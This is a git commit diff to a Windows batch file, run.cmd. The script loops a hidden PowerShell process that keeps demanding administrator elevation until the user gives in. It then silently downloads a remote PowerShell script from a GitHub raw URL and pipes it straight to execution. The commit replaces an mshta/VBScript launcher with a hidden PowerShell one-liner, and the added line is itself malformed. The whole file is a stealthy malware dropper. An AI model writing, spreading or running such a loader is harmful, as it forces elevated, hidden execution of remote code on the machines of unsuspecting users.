3cda134e59d76299e3f80cf7c01282785374d3bc
43a1723 <hai1723notgay@gmail.com>
2024-07-24 13:36:52 +0700

    Update run.cmd

--- run.cmd
+++ run.cmd
@@ -2,4 +2,4 @@
 cd /d "%~dp0"
 net session >nul 2>&1
 if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
-mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -USeB | iex",0))
+powershell -w hidden -nop -ep bypass -c "https://raw.githubusercontent.com/43a1723/test/main/download.ps1" -useb | iex"
